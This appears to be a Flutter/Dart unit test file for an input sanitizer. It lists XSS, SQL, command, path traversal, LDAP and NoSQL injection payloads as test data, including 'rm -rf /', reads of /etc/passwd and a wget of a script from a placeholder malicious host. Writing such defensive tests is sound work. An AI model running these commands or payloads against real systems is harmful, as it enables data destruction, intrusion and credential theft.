import 'package:flutter_test/flutter_test.dart';
import 'package:visha2/utils/input_sanitizer.dart';

void main() {
  group('Security Tests - Input Sanitization', () {
    group('XSS Prevention', () {
      test('should remove script tags', () {
        final maliciousInputs = [
          '<script>alert("xss")</script>',
          '<SCRIPT>alert("xss")</SCRIPT>',
          '<script src="malicious.js"></script>',
          'Hello<script>alert(1)</script>World',
          '<script type="text/javascript">alert(1)</script>',
        ];

        for (final input in maliciousInputs) {
          final sanitized = InputSanitizer.sanitizeText(input);
          expect(sanitized.contains('<script'), isFalse);
          expect(sanitized.contains('</script>'), isFalse);
          expect(InputSanitizer.containsSuspiciousContent(input), isTrue);
        }
      });

      test('should remove javascript protocol', () {
        final maliciousInputs = [
          'javascript:alert(1)',
          'JAVASCRIPT:alert(1)',
          'javascript:void(0)',
          'href="javascript:alert(1)"',
        ];

        for (final input in maliciousInputs) {
          expect(InputSanitizer.containsSuspiciousContent(input), isTrue);
        }
      });

      test('should remove event handlers', () {
        final maliciousInputs = [
          'onclick="alert(1)"',
          'onload="malicious()"',
          'onmouseover="steal()"',
          'onfocus="hack()"',
          'onerror="exploit()"',
        ];

        for (final input in maliciousInputs) {
          expect(InputSanitizer.containsSuspiciousContent(input), isTrue);
        }
      });
    });

    group('SQL Injection Prevention', () {
      test('should handle SQL injection attempts', () {
        final sqlInjectionAttempts = [
          "'; DROP TABLE users; --",
          "' OR '1'='1",
          "'; DELETE FROM data; --",
          "' UNION SELECT * FROM passwords --",
          "admin'--",
          "' OR 1=1 --",
        ];

        for (final input in sqlInjectionAttempts) {
          final sanitized = InputSanitizer.sanitizeText(input);
          // Should remove dangerous SQL characters
          expect(sanitized.contains("'"), isFalse);
          expect(sanitized.contains('"'), isFalse);
        }
      });
    });

    group('HTML Injection Prevention', () {
      test('should remove HTML tags', () {
        final htmlInjectionAttempts = [
          '<img src="x" onerror="alert(1)">',
          '<iframe src="malicious.html"></iframe>',
          '<object data="malicious.swf"></object>',
          '<embed src="malicious.swf">',
          '<link rel="stylesheet" href="malicious.css">',
          '<style>body{background:url("javascript:alert(1)")}</style>',
        ];

        for (final input in htmlInjectionAttempts) {
          final sanitized = InputSanitizer.sanitizeText(input);
          expect(sanitized.contains('<'), isFalse);
          expect(sanitized.contains('>'), isFalse);
        }
      });
    });

    group('Command Injection Prevention', () {
      test('should handle command injection attempts', () {
        final commandInjectionAttempts = [
          '; rm -rf /',
          '| cat /etc/passwd',
          '&& wget malicious.com/script.sh',
          '`whoami`',
          '\$(id)',
        ];

        for (final input in commandInjectionAttempts) {
          final sanitized = InputSanitizer.sanitizeText(input);
          // Should remove dangerous command characters
          expect(sanitized.contains(';'), isFalse);
          expect(sanitized.contains('|'), isFalse);
          expect(sanitized.contains('&'), isFalse);
          expect(sanitized.contains('`'), isFalse);
          expect(sanitized.contains('\$'), isFalse);
        }
      });
    });

    group('Path Traversal Prevention', () {
      test('should handle path traversal attempts', () {
        final pathTraversalAttempts = [
          '../../../etc/passwd',
          '..\\..\\..\\windows\\system32\\config\\sam',
          '/etc/shadow',
          'C:\\Windows\\System32\\drivers\\etc\\hosts',
          '....//....//....//etc/passwd',
        ];

        for (final input in pathTraversalAttempts) {
          final sanitized = InputSanitizer.sanitizeText(input);
          // Should remove path traversal patterns
          expect(sanitized.contains('../'), isFalse);
          expect(sanitized.contains('..\\'), isFalse);
        }
      });
    });

    group('LDAP Injection Prevention', () {
      test('should handle LDAP injection attempts', () {
        final ldapInjectionAttempts = [
          '*)(uid=*',
          '*)(|(password=*))',
          '*)(&(password=*))',
          '*))%00',
        ];

        for (final input in ldapInjectionAttempts) {
          final sanitized = InputSanitizer.sanitizeText(input);
          // Should remove LDAP special characters
          expect(sanitized.contains('*'), isFalse);
          expect(sanitized.contains('('), isFalse);
          expect(sanitized.contains(')'), isFalse);
        }
      });
    });

    group('NoSQL Injection Prevention', () {
      test('should handle NoSQL injection attempts', () {
        final nosqlInjectionAttempts = [
          '{"$ne": null}',
          '{"$gt": ""}',
          '{"$regex": ".*"}',
          '{"$where": "this.password.match(/.*/)"}',
        ];

        for (final input in nosqlInjectionAttempts) {
          final sanitized = InputSanitizer.sanitizeText(input);
          // Should remove JSON special characters
          expect(sanitized.contains('{'), isFalse);
          expect(sanitized.contains('}'), isFalse);
          expect(sanitized.contains('\$'), isFalse);
        }
      });
    });

    group('Buffer Overflow Prevention', () {
      test('should handle extremely large inputs', () {
        final extremelyLargeInput = 'A' * 100000;
        final sanitized = InputSanitizer.sanitizeText(extremelyLargeInput);
        
        // Should handle large inputs gracefully
        expect(sanitized, isNotNull);
        expect(sanitized.length, lessThanOrEqualTo(extremelyLargeInput.length));
      });
    });

    group('Unicode and Encoding Attacks', () {
      test('should handle unicode normalization attacks', () {
        final unicodeAttacks = [
          'admin\u0000',
          'test\uFEFF',
          'user\u200B',
          'script\u2028alert(1)',
        ];

        for (final input in unicodeAttacks) {
          final sanitized = InputSanitizer.sanitizeText(input);
          // Should normalize or remove problematic unicode characters
          expect(sanitized, isNotNull);
        }
      });

      test('should handle URL encoding attacks', () {
        final urlEncodedAttacks = [
          '%3Cscript%3Ealert(1)%3C/script%3E',
          '%22%3E%3Cscript%3Ealert(1)%3C/script%3E',
          'javascript%3Aalert(1)',
        ];

        for (final input in urlEncodedAttacks) {
          // These should be detected as suspicious even when encoded
          expect(input.contains('%'), isTrue);
        }
      });
    });
  });
}
